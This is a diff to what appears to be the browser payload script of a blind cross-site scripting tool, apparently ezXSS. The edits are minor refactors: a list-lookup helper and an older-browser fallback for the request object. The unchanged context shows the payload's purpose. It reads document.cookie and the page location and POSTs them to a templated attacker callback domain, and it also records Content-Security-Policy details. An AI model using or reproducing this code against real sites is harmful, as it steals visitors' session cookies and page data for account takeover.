@@ -5,10 +5,15 @@ function ez_n(e) {
     return void 0 !== e ? e : '';
 }
 
+function ez_has(list, value) {
+    for (var i = 0; i < list.length; i++) if (list[i] === value) return !0;
+    return !1;
+}
+
 function ez_cb(e, t, o) {
     o = void 0 !== o ? o : 0;
     var s, n = "{{protocol}}://{{domain}}/callback";
-    (s = new XMLHttpRequest).open("POST", n, !0);
+    (s = window.XMLHttpRequest ? new XMLHttpRequest : new ActiveXObject("Microsoft.XMLHTTP")).open("POST", n, !0);
     s.setRequestHeader("Content-type", "text/plain");
     s.onreadystatechange = function () {
         if (4 === s.readyState) {
@@ -128,7 +133,7 @@ function ez_cg(cb) {
 
 function ez_hL() {
     var cspDone = !1, cspNext = null;
-    if (ez_nc.indexOf('csp') < 0) { ez_cg(function () { cspDone = !0; cspNext && cspNext(); }); } else { cspDone = !0; }
+    if (!ez_has(ez_nc, 'csp')) { ez_cg(function () { cspDone = !0; cspNext && cspNext(); }); } else { cspDone = !0; }
     try { ez_rD.uri = ez_n(location.toString()); } catch (t) { ez_rD.uri = ""; }
     try { ez_rD.cookies = ez_n(document.cookie); } catch (e) { ez_rD.cookies = ""; }
     try {
@@ -358,7 +363,7 @@ var ez_mb = "/*ez:maxBody*/" | 0;
 var ez_nc = [/*ez:noCollect*/];
 
 var ez_cv = "";
-if (ez_nc.indexOf('csp') < 0) ez_aE(document, "securitypolicyviolation", function (e) {
+if (!ez_has(ez_nc, 'csp')) ez_aE(document, "securitypolicyviolation", function (e) {
     try {
         if (!ez_cv && e.originalPolicy) ez_cv = (e.disposition === "report" ? "content-security-policy-report-only: " : "content-security-policy: ") + e.originalPolicy;
     } catch (t) { }
